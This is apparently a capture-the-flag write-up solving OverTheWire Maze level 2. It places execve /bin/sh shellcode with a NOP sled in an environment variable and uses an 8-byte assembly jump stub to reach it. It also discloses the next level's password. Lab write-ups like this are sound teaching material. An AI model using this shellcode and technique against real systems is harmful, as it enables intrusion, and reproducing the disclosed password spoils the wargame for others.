
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> The binary takes user input, copies it into an 8-byte buffer using `strncpy()`, and **executes it as shellcode**. However, since the input size is just 8 bytes, we need to **bypass the length limitation** to spawn a shell.

---

### 🧠 Concepts Covered:

- 🐚 Shellcode injection via environment variable
    
- 📦 Assembly to jump to environment memory
    
- 🛠 `nasm`, `ld`, and `objdump` for shellcode crafting
    
- 💥 Stack execution and `execve` syscall
    

---

### 🔎 Binary Behavior

From decompiled logic:

```c
char buf[8];
strncpy(buf, argv[1], 8);
((void (*)())buf)();  // Executes buf as code
```

We can't fit a full `/bin/sh` shellcode in 8 bytes — so instead, we’ll:

> Place the **real shellcode in an environment variable** and use the 8-byte buffer to **jump to it**.

---

### 🧨 Step-by-Step Exploit

---

#### 🧬 Step 1: Craft shellcode in an environment variable

```bash
export SC=$(python3 -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
"\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

- NOP sled (`\x90` x100) increases success rate
    
- Shellcode spawns a shell using `execve("/bin/sh", ...)`
    

---

#### 🔩 Step 2: Write a small assembly stub to `jmp` to env shellcode

**File:** `pwn.asm`

```asm
section .text
    global _start

_start:
    mov eax, 0xffffdf0c    ; Address of environment shellcode
    jmp eax
```

📦 Assemble and link:

```bash
nasm -f elf pwn.asm
ld -m elf_i386 -s -o pwn pwn.o
```

📜 Extract machine code:

```bash
objdump -M intel -d pwn
```

You'll get something like:

```
b8 0c df ff ff    ; mov eax, 0xffffdf0c
ff e0             ; jmp eax
```

Hex shellcode:

```bash
\xb8\x0c\xdf\xff\xff\xff\xe0
```

---

#### ▶️ Step 3: Run the binary with jump code

```bash
/maze/maze2 $(python3 -c 'print("\xb8\x0c\xdf\xff\xff\xff\xe0")')
```

This triggers the jump to our environment shellcode and spawns a shell.

---

### 🔑 Password for Maze Level 3:

```
beinguthok
```

---
